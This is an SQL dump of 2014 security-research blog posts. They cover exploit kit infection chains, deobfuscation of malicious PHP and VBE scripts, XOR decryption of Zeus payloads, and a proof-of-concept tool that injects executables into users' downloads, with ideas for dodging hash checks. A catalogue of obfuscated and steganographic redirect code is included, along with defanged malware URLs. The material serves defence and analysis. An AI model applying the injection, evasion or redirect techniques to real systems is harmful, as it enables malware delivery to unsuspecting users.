Interjector is running, the same download dialog box now looks like this (note the file size):\n\nWhat’s happening behind the scenes is that there is a specially-crafted EXE file that’s been added to Interjector as a resource. When the program sees a GET request to any EXE file, it loads the resource to a variable and gets ready. When the program sees the response, it reads in the Content-Length value, adds the length of the resource to it, and puts the updated value back into the header. Finally, it injects the variable containing the resource into the download stream.\nThe advantage of doing it this way is that I don’t need to redirect users to another server, I can intercept/inject any EXE file the user downloads, it’s very stealthy, and all of this happens in real time.\nHere’s what it looks like when the downloaded file is executed:\n\nUgh, the icon makes it look fake but I can fix that. This is going to be a challenge for those programs with unique icons. The best way is probably to use a generic icon like this and hope users don’t notice.\n\nWhat about the MD5/SHA hash? That’s the biggest hurdle to overcome. I could change the hash on the webpage to match the final file but only for the ones I know about by doing a global search and replace. Or I can search for any hash line and remove it from the webpage.\n\nWhat if it’s a compressed file download (e.g. ZIP)? I think I would have to rezip the file with a new EXE or rebuild the download which changes the ZIP file to an EXE. The real-time requirement makes this difficult to handle without the user taking notice. \nSo what’s a user to do?\n– Use HTTPS to download programs\n– Choose to download a compressed version (e.g. ZIP) instead of a bare EXE/MSI file\n– Pay attention to any anomalies and inconsistencies; when in doubt, stop\n– Verify the program’s hash before installing (for the paranoid, use an out-of-band device like your phone to view the hash on the webpage)', 'inject, intercept, network injection, poc', 'http://www.kahusecurity.com/?p=13160\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (40, 'Wild Wild West – 07/2014', 'darryl', 'July 25, 2014', 'Added the following packs:\nRIG Exploit Kit\nNiteris aka “CottonCastle”\n“Snet”\nSpecial thanks to Kafeine for his valuable input.', '', 'http://www.kahusecurity.com/?p=13149\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (41, 'Reversing a PHP Script Dynamically and Statically', 'darryl', 'July 11, 2014', 'A reader sent me two PHP scripts because the PHP Converter program I wrote wasn’t able to handle it. They are both similar so I’ll just work on one of them in this post. Here’s what it looks like:\n\nAnd this is what happens when you try to use PHP Converter:\n\nLet’s reverse this script dynamically and then statically.\nFirst, I’ll just change the ‘eval’ keyword to ‘echo’. \n\nAnd take a peek at what’s going on.\n\nYikes, this is messed up! I thought the PHP file got corrupted somehow but then I looked closely and noticed several PHP keywords. This is actually a pretty clever technique. Basically the script is converting the strange characters to text but it’s surrounded by long, seemingly random strings that are variable names.\nSo I figure I would just write it out to a file and then change the ‘eval’ I noticed at the end to ‘echo’.\n\nHere’s the resulting file:\n\nI’ll just make that quick change and run it again.\n\nCool, now we know what this script does!\nNow let’s reverse this script statically.\nHere’s a new, fixed version of PHP Converter. I added a filter to present the results of the deobfuscation without stopping if it encounters any strange characters. The characters outside the alphanumeric range will be represented by a neutral character.\n\nI also added the ability to output the result to Base64 format and/or to a file. With both options checked, you will get a text file of the result encoded in Base64 so the binary values will be preserved.\n\nNow I can convert this base64-encoded string to text using Converter.\n\nAfter cleaning this up, we can see that the section below is XOR’ing the blob using the decimal value of ’30’ which is assigned to the first variable.\n\nI’m going to convert the base64-encoded string to hex this time.\n\nThen send the data to Converter’s Key Search/Convert feature and set the values accordingly:\n\nAnd I get this result. The junk at the top and bottom is the result of XOR’ing the original text so I can ignore that.\n\nThere are other ways to get to the final result but I think these two methods are straightforward and quick/easy to do.\nThe updated version of PHP Converter can be downloaded here.', 'deobfuscation, php obfuscation, phpconverter', 'http://www.kahusecurity.com/?p=13140\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (42, 'Deobfuscating PHP Scripts', 'darryl', 'June 1, 2014', 'Occasionally people send me PHP scripts to help them analyze it. Most of the time, it’s simply unescaping the script and finding the right variable to echo. I got two tricky ones within the past couple of months and finally got around to writing a program to quickly deobfuscate them. These scripts represent obfuscation methods that make it difficult to read them but they don’t employ character rotation, XOR, base64, etc. I’m not sure if there’s an easier way to do this; if there is, I’d like to hear about it.\nI already wrote a tool to handle an older variety of this method and I decided to add functionality to handle the newer ones. I also added a pretty basic (crappy) beautifier and making this available as a separate download (I think I’ll add this to Converter later).\nMethod 1 – Array Search/Replace\nThis script uses an array of base64-encoded strings. The second part of the script references specific values from the array. The obfuscated script looks like this:\n\nThe idea is to first base64-decode the strings and load them into an array. Loop through the array and replace the calling variables with the actual values.\nYou should concatenate the strings first. I use Converter but even Notepad will do.\n\nThen you need to base64-decode the strings. Again I’m using Converter.\n\nUsing the PHP Script Decoder tool, I paste the result from above to the “Lookup Array” box. I paste the obfuscated script to the input box. When you choose the Array method you have to enter a delimiter (in this case the comma is used) and the search string. The search string is the variable you wish to replace with the value. In this case I enter “_449578015(#)”. The pound sign is a placeholder which the tool needs.\nHere’s what it looks like. Now the deobfuscated script is much easier to figure out.\n\nIf you want to beautify the script, click on the “Copy Output to Input” button then click on the “Beautify” button.\n\nThe result is a simple and rough cleanup of the script.\nMethod 2 – Random Variables\nThis script uses randomize variable names and assigns a value to it. The later portion references the value. Here’s what this looks like:\n\nThe tool will parse the script and load each variable and associated value into an array. It then does a search for the variable and replaces it with the value.\nI just paste the entire script in the input box and choose the “random vars” option. The delimiter for this script is a semi-colon and for the search string I enter ${“GLOBALS”}[“#”]=”*”; The pound sign is a placeholder for the variable name and the asterisk is the placeholder for the value.\nHere’s the result:\n\nMethod 3 – Key Lookup\nThis script uses a lookup array to build the values for its variables. Each character in this string is loaded into an array:\n“,`TD[r)Ej|4*^QXOK\\t: @.tl#2%\\\\L\\r_R-~b=Z7zaV{]S+’Gio>gd058up6C!HkwxmvN?nJI(\\”FMWc3hYs\\$&;\\nBA\nHere we go…the first step I do is paste the entire script in the input box and choose the key lookup option. The delimiter is irrelevant. I use $f9[#] as the search string. In the lookup key box I need to paste the key with the starting and ending quotes. The tool will unescape the value so you don’t have to do it yourself.\n\nYou can see that the strings should be concatenated so I check the box and click on Convert again.\n\nNow I click on the “Copy Output to Input” button and choose the random vars option. I leave the delimiter to semi-colon and use $GLOBALS[‘#’] = ‘*’; as my search string.\n\nAh, much more readable! By the way, you may have seen this on several compromised sites as the output looks something like this:\nLinux10+cfcd208495d565ef66e7dff9f98764da\n-or-\nWINNT20+cfcd208495d565ef66e7dff9f98764da\nThis script is essentially an emailer.\nYou can find this program here.', 'php obfuscation, php script', 'http://www.kahusecurity.com/?p=13126\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (43, 'Reversing RIG EK’s Flash File', 'darryl', 'May 23, 2014', 'VirusTotal is showing 0 out of 51 for RIG EK’s SWFIE exploit (MD5: 65AFF3A3774298B3ED5BA2C43F8A1979). Here’s a really quick overview on how to reverse this exploit file so we can determine which vulnerability it’s using. This method can also be used on Infinity EK’s flash file and probably others.\nFirst, you need to use your favorite method to decompile the SWF file. I always try to give ActionScriptExtractor the first shot. If it doesn’t work, you might have to use a commercial tool like I did. Looking over the decompiled code, there’s an interesting function called “onus”.\n\nVariable _local5 is assigned a value of “4939333”. This value is used to XOR each value from the large array. The _local2 array consists of Qwords in decimal and hex formats.\nI wrote a program that will convert the Qwords to decimals then XOR the values with an XOR key. It will then write it out in little Endian format just like the ActionScript indicates.\n\nAfter converting the decimal values to hex and writing it out to a binary file, I get another SWF file (MD5: 04FC52BE437FF46465F42994F0DC5AAE). VirusTotal detects this with 3 out of 53 AV with one saying it’s CVE-2013-0634.\n\nThe decompiled version looks like this:\n\nHere we see the exploit code:\n\nThis part here writes out the shellcode after base64-decoding it.\n\nThe Javascript from the landing page contains the base64-encoded shellcode which is read in by the ActionScript.\n\nThe code does look similar to CVE-2013-0634 but my understanding of the Flash exploit tells me this is really CVE-2014-0322. \nAnyway, the point of this article was really to make available the tool to convert Qword, Dword, and Word values to decimal. I’ll continue using it and work out any kinks before adding it to Converter. You can download this tool here if you want to give it a try.', 'exploit kit, flash, rig', 'http://www.kahusecurity.com/?p=13112\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (44, 'RIG Exploit Pack', 'darryl', 'May 12, 2014', 'A new exploit pack has been marketed in the underground since last month and appears to be picking up some steam. The new pack is called RIG and touts the following exploits:\nJava – CVE-2012-0507, CVE-2013-2465\nIE 7/8/9 – CVE-2013-2551\nIE 10 – CVE-2013-0322\nFlash – CVE-2013-0634\nSilverlight – CVE-2013-0074\n\nThe pack is said to have an average rate of 8-12% and costs $60 per day or $300 per week.\nHere’s what a typical infection chain looks like. Look closely and you can see why this is being pegged as Infinity EK. There are similarities but they are different packs.\n\nOn a compromised website, the iframe tag leads to the TDS rotator:\n\nIf everything checks out then you get another iframe (the bottom part of the page appears to be a tracker):\n\nOn the counter.php page, there’s yet another iframe. This time you get to the landing page of the exploit pack:\n\nThe landing page is a large file and consists of five scripts. The top section, through some misdirection and obfuscation, assigns a value of “body” to the “vx” variable which is used by the following four scripts.\n\nEach of the four scripts looks something similar to this. All it’s doing is building up decimal values that are on each line preceding with “pop” to the variable “bui” which is then converted to ASCII and appended to the body element.\n\nThis is the result after deobfuscating one of the scripts. This sets up the Java exploit.\n\nHere’s one for Silverlight. You can see the URL to the exploit followed by the shellcode in Base64.\n\nThe D&E shellcodes which are passed as a parameter to the exploit code are XOR-encoded each with it’s own unique five-value hex key.\n\nSince the landing page contains all of these scripts, you get hit with several exploits at once leading to multiple payloads asking to bypass UAC. It’s very noisy and inefficient.\n\nIf the exploit is successful, the payload is downloaded and executed and then requests are made to the following sites to download crimeware:\nzemmes-gimbl .com/b/shoe/1928\nchanse-leaf .com/com_phocaguestbook/jquery/\nFiles called “UpdateFlashPlayer_[random].exe” are downloaded to the temp folder with the hidden attribute set which prompts the user incessantly.\nFile: applet.jar\nMD5: 9c6317f0c22b0782fac5858d0c4c4886\nVT: 4/52\nFile: flash1.swf\nMD5: 65aff3a3774298b3ed5ba2c43f8a1979\nVT: 0/52\nFile: flash2.swf\nMD5: 40fd69626f5248012b6d5bd2e4d2fc9b\nVT: 0/52\nFile: 264078.exe\nMD5: e4f53ece665e71955bf8f9170e3324a1\nVT: 9/52\nFile: ewuwxeu.exe\nMD5: ea8dbf470fb0dc41e10d2dcf69f53153\nVT: 14/52\nFile: UpdateFlashPlayer_5386a177.exe\nMD5: 60b1cbb5d9af6125d011bd7306afec64\nVT: 2/51\nFile: UpdateFlashPlayer_9609e705.exe\nMD5: 8caf8b2f7198bc757541a93267447460\nVT: 10/52', 'exploit kit, rig', 'http://www.kahusecurity.com/?p=13102\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (45, '8×8 Script Leads to Infinity Drive-By', 'darryl', 'April 6, 2014', 'The “8×8” script I’m referring to includes a link that looks like this:\nhxxp://www.example .com/JB3xd6iX.php?id=87342871\nAnd can be detected using a regular expression that looks something like this:\n/^.*\\/[a-z0-9A-Z]{8}\\.php\\?id=\\d{8}$\nOne set of links redirect users to social engineering scams (e.g. fake Adobe Flash Player update) that I wrote about earlier. Another set redirects users to Infinity EK (aka “RedKit”, “GoonEK”).\nFirst, let’s see how this drive-by looks like from the users’ perspective.\nThe user visits a website that’s been compromised. On one of the webpages, there’s a script with the filename containing eight random characters followed by an ID value which has eight digits (i.e. the “8×8” script).\n\nThe user is then redirected to another legitimate website that’s been previously compromised. This site serves up a script that leads to another site.\n\nThis site is also legitimate and compromised. It houses the Infinity Exploit Pack script which tries to exploit the user’s browser.\n\nThis is what the deobfuscated version of the landing page looks like. If the exploit is successful, there’s a request for the malicious payload file back to the same site.\n\nInfinity has an arsenal that includes two Java, two MSIE, Flash, and Silverlight exploits. The author(s) have been adding updates to their arsenal as well as modifying the links and infrastructure since the last time I analyzed it as RedKit v2.0.\nNow let’s look at what’s happening behind the scenes. A webmaster provided me with suspicious files from his compromised website after I informed him his site was redirecting users to a drive-by. (I promised I would not reveal his site name so I redacted and/or modified the following screens.)\nTurns out his site was compromised two different times. The first time, the attacker modified at least one HTML page and inserted the following script tags:\n\nSometime later, the/another attacker modified the index.php file and inserted a PHP script that would download content from another website.\n\nRunning this script, makes a request to a backend server and produces a seemingly endless number of new links:\n\nI was very fortunate that the compromised website had both the infected index.php file and the 8×8 script on his server. The link above leads to a PHP script on another site but I’m pretty certain it’s the same as the one below (which is also the same as the one I wrote about earlier).\n\nDeobfuscating the script is no longer a chore so I can extract the contents of the encrypted config string.\n\nRunning it produces the TDS IP, key, and other information:\n\nSo this is what’s going on…\n\nHere’s a series of packets showing this:\n\nThe scripts are all the same and therefore appears to be the work of the same gang behind RedKit v2, Box Fraud, Goon EK, and Infinity.', '8x8, exploit kit, goon, infinity, redkit', 'http://www.kahusecurity.com/?p=13089\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (46, 'Wild Wild West – 04/2014', 'darryl', 'April 5, 2014', 'sorry this is so late. added the following packs:\n“Zuponcic”\nInfinity (aka “RedKit”, “GoonEK”)\nRamayana (aka “DotkaChef”, “DotCacheF”)\nRSPandorasBox\nTop-Exp (aka “Magnitude”)', '', 'http://www.kahusecurity.com/?p=13072\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (47, 'VBE Script Leads to Bank Fraud', 'darryl', 'April 5, 2014', 'I only stumbled on this at the middle so I don’t know how this is being targeted to users. Apparently this particular scam has been out there since at least August 2013 and it’s still up and running.\nThis is a VBScript Encoded file (VBE) that starts off the fraud:\n\nAnd it looks like this:\n\nUsing a VBE decoder, I can convert the file to get the following. You can go here or here for the decoder.\n\nThere’s several functions in this script and the one at the top deobfuscates the content by doing some math to convert decimal values to ASCII. The AppdataPath and File1 variables look interesting so I just add this to the script:\n\nThis pops up the deobfuscated values then quits before it executes anything further. Here’s the result which tells us where the file will be written to and where to download the file from.\n\nLet’s get the second VBE file and decode that one as well.\n\nWhile going through the script, this pops up:\n\nThis turns out to be a proxy.pac malicious script! Downloading the third file, I get this obfuscated proxy.pac file.\n\nAfter I clean this up, here’s what we get:\n\nAfter analyzing the scripts, here’s what it does…it changes the proxy values in IE and Firefox browsers:\n\nThen, whenever the user visits one of the sites found in the proxy.pac file, they get redirected to a phishing page but the URL bar shows that they are at the right banking site.\n\nTruncating the path reveals an open folder that contain files that make up the phishing page which is a sign we truly are not on the legitimate site.\n\nHere’s what the real banking site looks like:\n\nPacket captures shows that our traffic is indeed being sent to the phisher’s site when we attempt to visit one of those Brazilian bank sites.\n\nHere’s information about the domains and files:\nDomain: eua.bestworked[.]com\nIP: 64.74.223[.]40\nDomain: euas.bestworked[.]com:8082\nIP: 64.74.223[.]40\nDomain: mn.dmanwork[.]com:8082\nIP: 8.5.1[.]49\nFilename: update.vbe\nMD5: a8f52fb1a543abf5ac18ae2dbc0351e8\nVT: 3/48\nFilename: seta.vbe\nMD5: 3fc44dae258d0316179541db44d09ad7\nVT: 4/51', '', 'http://www.kahusecurity.com/?p=13069\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (48, 'Scout — New Tool Released', 'darryl', 'March 25, 2014', 'Here’s another tool that you might find useful when analyzing potentially infected websites. Scout is Pinpoint on steroids. Scout uses the Pinpoint engine and includes a feature from Revelo that makes this more functional and…risky. Let me explain.\nPinpoint downloads webpage components akin to using wget or curl. Pinpoint does not render the content making this safe to use even without a VM. Scout, on the other hand, gives you the ability to render content in select files so it can collect the URLs it’s trying to access (Revelo already includes this feature). This is great for those who don’t know how or have the time to deobfuscate Javascript. You just render the script and catch the results. However, if the file contains exploit code, your computer could get infected.\nI did consider simply adding the new features to Pinpoint and calling it v2.0 but this could potentially cause confusion since Pinpoint is a safe tool to use so I decided to leave Pinpoint alone and create a new tool called Scout (I’ll still maintain both code bases). As its name implies, Scout seeks information about your target and does so rather progressively.\nOne other feature I thought would be useful was to give Scout the ability to take a screenshot of the webpage. The best and safest method I could come up with is using PhantomJS. It uses the WebKit browser engine so it’s way more safer than IE but there is added risk since the infected/malicious page has to be completely rendered. That’s the other reason why I wanted to separate this from Pinpoint.\nSo let’s see this in action…\nHere’s Scout with its two new features:\n\nTo activate the screenshot capability, download PhantomJS from here and copy the Windows executable to the same folder that Scout resides in. Now the “Take Screenshot” option lights up and you can enable and disable it as you choose. Scout will automatically create “rasterize.js” which is used to produce the screenshot. You can modify it (e.g. change its user-agent string) and Scout will use it going forward.\n\nHere’s what the workflow might look like. Enter a URL then click on start.\n\nAfter Scout pulls down the main page, it will launch PhantomJS and perform a screenshot of the site which gets saved as a PNG file:\n\nViewing Scout’s capture file, we see some obfuscated Javascript in the source code. Since the Pinpoint engine won’t render it, we don’t know what this does.\n\nCopy/paste the Javascript and save it to an HTML file. Be sure it has the <script></script> tags (or <html></html> tags as necessary).\n\nClick on Tools > HTTP Request Simulator, choose the file, then click on Start.\nWhat I’ve done is include some of Revelo’s functionality into Scout. There is a built-in WebBrowser Control that renders the URL. As the WebBrowser Control makes requests to external content (e.g. Javascript, CSS, images, etc) or redirects the browser depending on the webpage contents, Scout will collect the links then drop the HTTP responses before it reaches the browser. This should, in theory, prevent your computer from getting compromised but I can’t guarantee it so you ought to run this in a VM.\n\nHere’s another example…\nFirst, let’s paste in the URL and click on Start:\n\nHere’s the screenshot of the site:\n\nReviewing Scout’s capture file, we see Javascript (exploit code) from Infinity EK:\n\nExtract the script from the page and save it to an HTML file:\n\nSince this has a lot of scripts, the internal WebBrowser Control may not be able to handle it so you can optionally use your Internet Explorer browser. When you run Scout and click on Tools > HTTP Request Simulator, Scout will automatically set IE’s proxy setting to “localhost:8080” (which is changed back after you close HTTP Request Simulator). All you need to do is leave the “File” field empty, click on Start, then open the HTML page in IE (note: you can do this with Firefox or Chrome too as long as you set the proxy settings yourself).\nHere we see IE executing the js.html file with the exploit code. Scout’s HTTP Request Simulator is catching the requests, dropping the responses, and displaying the results. The VM did not get infected but I’ll never run this on my host computer, just in case. And neither should you.\n\nIf you don’t see anything in the “results” box then maybe the script doesn’t have any redirect code or doesn’t reference any external content. Or maybe it relies on jQuery in which case you can paste in the jQuery script into your file.\nYou can download Scout from tools page.\nBy the way, I do appreciate all of your emails in support of Pinpoint! I’m glad it is helping you with your analysis and I hope Scout can further your research.', 'curl, phantomjs, pinpoint, revelo, scout, wget', 'http://www.kahusecurity.com/?p=13053\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (49, 'Converter Updated', 'darryl', 'February 17, 2014', 'The latest version includes several new features and bug fixes:\n\n Fixed Mixed Octal to Hex function to handle null char at the end\n Fixed and enhanced code related to keep/strip filtering functions\n Fixed unescape handling of null bytes\n\nUnescape File\nUnder the File menu > Unescape File allows you to unescape a text file. You have the option to beautify the Javascript using JSBeautifier (Note: if it’s not Javascript, you will likely get disappointing results).\n\nConvert Binary File\nAdded the ability delete bytes in the File > Convert Binary File function. The bytes are deleted before any action is taken.\n\nSort Text\nUnder the Format menu > Sort Text you can now sort by characters, rows, or comma-delimited values.\n\nRange Search/Replace\nUnder the Tools menu > Range Search/Replace enables you to do a search and replace using one of three methods. While you can also do this using regex in Search/Replace Text, this is another way I thought I’d add.\n\n\nKey Search/Convert – Calculate Distance\nAdded a method to have Converter try to automatically find a multi-byte XOR key. You can read this blog post where I describe how this works.\nJust import a binary file that you suspect is an executable. You only need the first 1K bytes so leave that checkbox at the top checked. Click on the “Calculate Distance…” option. It will automatically paste in the DOS header string and set it to auto mode. Converter will start using offset 1, 2, 3…until the (near) length of your search string. I found it generated too much false positives if I used the entire length. You can get false positives when you have a short search string or large offset.\n\nConverter, File Converter, and Data Converter can all be downloaded from here. Thank you for your support!', 'converter, dataconverter, fileconverter', 'http://www.kahusecurity.com/?p=13038\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (50, 'Exploring XOR Decryption Methods', 'darryl', 'February 11, 2014', 'The use of XOR encryption to keep anti-virus, web filters, and even researchers at-bay have been used for many years. While there are stronger encryption algorithms, the XOR cipher is very easy to add to a project, has low overhead, and is still quite effective even today.\nConverter has four ways to help you figure out what the XOR key is. For a single XOR key, you can use Converter’s Key Search/Convert. If it’s a PE file it may have the string “This program cannot be run in DOS mode” in the header. Let’s try that. We just need the first 1KB so import the file and leave the “Import First KB” checkbox checked. Make those setting changes and click on the Search button.\n\nThe XOR key of 0x8E was found!\nIf you’re not sure if it is a PE file, you can have Converter enumerate all the XOR values to a text file. To do this, check the “Output First…” box then click on the Search button. Scrolling through the results, you may come across the PE magic and part of the header. The value of 142 is the decimal equivalent of 0x8E.\n\nFor XOR keys with more than one value, there’s a couple of ways to find the key besides brute forcing each value. One way is import 1KB of the file once again then copy that to the main screen. Choose Stats > Hex Frequency. The output will show you the number of times each hex value has been seen in the input. Notice that eight hex values show up over 80 times. This is likely the XOR key in no particular order. You can now start brute forcing the file with these values. \n\nThe second way is to paste the imported data and then choose Tools > Pattern Finder. Converter will try to find the longest repeating pattern in the data string. This will take awhile but you will hopefully get decent results like this:\n\nThis isn’t the actual XOR key. You could copy the output to the input box and have it look for the next longest repeating pattern again (and again). But you don’t need to. Here is the result of the first pass:\nDCD43089E77A630FDCD43089E77A630FDCD43089E77A630FD\nCD43089E77A630FDCD43089E77A630FDCD43089E77A630FDC\nD43089E77A630FDCD43089E77A630FDCD43089E77A630FDCD\n43089E77A630FDCD43089E77A630FDCD43089E77A630FDCD4\n3089E77A630FDCD43089E77A630FDCD43089E77A630FDCD43\n089E77A630FDCD43089E77A630FDCD43089E77A630FDCD430\n89E77A630FDCD43089E77A630FDCD43089E77A630FDCD4308\n9E77A630FD\nYou can see a pattern with the following string being repeated many times:\nDCD43089E77A630F\nThey look like hex values but we don’t know where one ends and the other begins. One clue is to look at the hex frequency screenshot above. It’s the same values! But we don’t know what is the first value of the XOR key is.\nGoing back to Key Search/Convert, delete all of the input data except for the first two characters which is 0x80 in this case. Search for “M”. We get the result 0xCD which is the first value in the XOR key.\n\nNow we can figure out what the 8-byte key is:\n0xCD 0x43 0x08 0x9E 0x77 0xA6 0x30 0xFD\nLet’s test it out…it works!\n\nA couple of weeks ago, I read an article called, “Efficient Detection of XOR-Encoded Traffic” by Josh Homan. This concept is not new but for some reason, his excellent write-up caught my eye so I started to study this more closely. I tried using other algorithms besides XOR but I couldn’t come up with anything more efficient and effective.\nPlease check out his article as he did a great job explaining the concept (thanks Josh!). The basic idea is to look for the same distance between two values in the input data. Let’s use the same string Josh used in his example,\nThis program cannot be run in DOS mode.\nThe distance between “T” and “h”, “h” and “i”, “i” and “s”, etc would be the same even though the string has been XOR-encrypted with a single XOR value. If the XOR key is four bytes for example, then you need to offset by the same value and look for the same distance between “T” and ” “, “h” and “p”, “i” and “r”, etc.\nI’ve added the concept to the next version of Converter which I’m still testing. I had to modify the Key Search section to accommodate for this but it seems to work pretty well. I do get false positives when the search string is short or the offset is large.\nTo use this feature, import 1KB of your data and choose “Calculate Distance…”. Converter will pre-fill the Match String for you. If you toggle between Single Key Search and Calculate Distance, the Match String will switch between “This program cannot be run in DOS mode.” and “This program must be run under Win32” for you.\nIf you leave the offset at 0, it will automatically go through the length of your search string and will try to find the first match. Enter an offset if you want to try a specific XOR key length.\n\nThe same 8-byte XOR key is found but again, we’re not sure what value goes first. Paste the key, set the options, and click on Convert. If that doesn’t work, you need to shift the XOR key over by one so just click on the new “Rotate Key” button and it does it automatically.\n\nOnce you have your key, use Converter’s File > Convert Binary File to process the entire file.\nAgain, it’s not perfect and you will encounter false positives but should give you a great starting point.\nSo then I thought, why stop at this — why not have a tool that can automatically XOR-decrypt a file? I needed to find a good live example to test my theory on…\nBy now I’m sure you have read about GameOver ZeuS now using encryption to get their files past network security. If not, you can read these two write-ups:\nCyberCrime & Doing Time – GameOver Zeus now uses Encryption to bypass Perimeter Security\nCrySyS Blog – GameOver Zeus now uses Encryption to bypass Perimeter Security – .enc encryption\nBased on CrySyS’ writeup, the downloader program downloads an “.enc” file, XORs the file with a four-byte key, then decompresses it using LZNT1. If I had to do this manually, I would either extract the key from RAM after running the downloader or figuring out the key in Converter as described above. But by using Josh’s technique, I can automatically find the key.\nHere’s the plan for a POC:\n\n Open the “.enc” file and check for the “ZZT ” magic (0x5A5A5000)\n Remove the magic bytes\n Calculate the distance for “program” then shift the XOR key over by one\n Decrypt the file using the XOR key\n Write it to a temp file (for debugging purposes)\n Uncompress the file using LZNT1\n Write out the PE file\n\nThe LZNT1 tool they used isn’t able to decompress everything for some reason. I had the same problem too but this works most of the time. There is a debug checkbox that will show you the XOR key it found and preserve that temp file so you can check it out.\nI found three live samples here:\nhxxp://farmyarddog .co.uk/images/pdf.enc (97B200826B7A526D91FDA4C56DC438AE)\nhxxp://svsmills .com/images/pdf.enc (2FF56C80DAE376FED059E12033690DFC)\nhxxp://mararu .ro/Media/07UKex.enc (9DF4F00EF32806905C3E92286FDE7F0B)\nHere’s the hex view of one of the files showing its magic bytes:\n\nI run the program on each of the files:\n\nAnd I get back three decrypted and uncompressed files automatically:\ndecrypted1.exe (542A5A6F04DDCAD3EFFC72121C59E332)\ndecrypted2.exe (11E9BF6E9FEDD3EC64163594371BA790)\ndecrypted3.exe (49686AB2AE3ECF219024A6E4F990AB79)\nHere’s the hex view of the temp file (after it’s XOR’d and before it’s decompressed). If you look closely you’ll see that there are some null bytes in the DOS header which is why the program isn’t searching for the entire header string, just the word “program”.\n\nFew notes:\n\n If the .enc file doesn’t have the magic bytes then the program will end\n If the XOR keys cannot be found automatically (probably because the file is not a PE), the program will end\n If the decompression process fails for some reason then you might get a small file with partial results\n\nYou can download the tool from here.', 'enc, gameover, lznt1, xor, zeus', 'http://www.kahusecurity.com/?p=13029\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (51, 'Pinpointing Malicious Redirects', 'darryl', 'February 8, 2014', 'Cybercriminals are constantly thinking up new ways to redirect unsuspecting visitors to their drive-by landing page. The guys over at Sucuri often find really interesting redirects that they’ve come up with.\nWhat I have been doing lately is documenting these redirection methods so that I can program Pinpoint to look for these methods when it analyzes webpages. I believe it’s useful to identify these methods so that you can tell if it’s an Infinity EK (aka RedKit, GoonKit), ramayana EK (aka DotkaChef), DarkLeech, or another type of website infection.\nHere’s what I collected so far. Some of these methods are deprecated, browser-specific, or won’t work unless the browser is in compatibility mode but I’ve captured them anyway (btw, these two sites were very helpful).\nMeta Refresh\n<meta http-equiv=”location” content=”url=http://www.google.com” />\n<meta http-equiv=”refresh” content=”0;url=http://www.google.com” />\nJavascript Redirect\ndocument.domain=”http://www.google.com”;\ndocument.location=”http://www.google.com”;\ndocument.location.href=”http://www.google.com”;\ndocument.URL=”http://www.google.com”;\nlocation=”http://www.google.com”;\nlocation.assign(“http://www.google.com”);\nlocation.host=”http://www.google.com”;\nlocation.hostname=”http://www.google.com”;\nlocation.href=”http://www.google.com”;\nlocation.reload(“http://www.google.com”);\nlocation.reload=”http://www.google.com”;\nlocation.replace(“http://www.google.com”);\nself.location=”http://www.google.com”;\ntop.location=”http://www.google.com”;\ntop.location.href=”http://www.google.com”;\nwindow.location=”http://www.google.com”;\nwindow.location.assign(“http://www.google.com”);\nwindow.location.href=”http://www.google.com”;\nwindow.location.replace(“http://www.google.com”);\nwindow.navigate(“http://www.google.com”);\nwindow.open(“http://www.google.com”);\nwindow.showModalDialog(“http://www.google.com”);\nwindow.showModelessDialog(“http://www.google.com”);\nCSS\n<div style=”width:expression(document.location(“http://www.google.com”))”>hello</div>\n<style>body{width:ex/**/pression(document.location(“http://www.google.com”));}</style>\n<style>body{background-image:url(javascript:document.location=”http://www.google.com”);}</style>\nOnError\n<img src=”missing.jpg” onerror=document.location=”http://www.google.com”;>\nOther\nBy changing the data type to Javascript, it will decode and execute the script that’s in base64:\n<script src=”data:text/javascript;base64,dG9wLmxvY2F0aW9uPSJodHRwOi8vd3d3Lmdvb2dsZS5jb20iOw==”></script>\nYou don’t actually need to define the data type as this works too:\n<script src=”data:;base64,dG9wLmxvY2F0aW9uPSJodHRwOi8vd3d3Lmdvb2dsZS5jb20iOw==”></script>\nSame thing here except the data type is set to HTML:\n<object data=”data:text/html;base64,PHNjcmlwdD50b3AubG9jYXRpb249Imh0dHA6Ly93d3cuZ29vZ2xlLmNvbSI7PC9zY3JpcHQ+”>\nBy saving the redirect content in an external file, it will be read and executed with this:\n<object data=”redir.htm” type=”text/html”>\nIn this redirect example, the name of the file holds the key. The script reads in the filename and after subtracting 5 from the decimal equivalent of the characters, converts it to “google.com” which you are redirected to.\n\nI saw a similar example in the wild awhile back. In this script, I assigned colors of various parts of the webpage but those are actually decimal values of the redirect script.\n\nFirst, let me show you what the webpage looks like. I just searched for random images on Google and put them on the webpage.\n\nNow have a look at the source code and you can see what I’m using the images for. The script grabs the width and height of each photo and converts these decimal values to text which is the redirect script. This one took a lot of patience since I had to resize each picture to the decimal values I needed without overly distorting the images.\n\nFor this redirect I use the obfuscation method found in live examples and combine it with the technique above. The logo.png’s width and height was also resized to the decimal values I needed then referenced by the script. This value is the key (multiplier) that converts the “x-y coodinates” at the top into the redirect script.\n\nHere, I embed a secret value at the end of a PNG graphic file. I use VBScript to extract the bytes I needed which are converted into the redirect script.\n\nHere’s the shot of the data I added to the graphic file using a hex editor. \n\nHere’s a crude method to extract data from a photo, convert the bits into text then eval the result. This works on older versions of IE. The code, Binary Ajax, from this site can be used to make this work on newer versions.\n\nTo make this, I just grabbed a random image from Google:\n\nThen I added the hex equivalent of the redirect script in the “Authors” field.\n\nThe bytes are extracted with the help of VBScript. The Javascript portion converts the hex to ASCII and evaluates it. And like the rest, you end up on 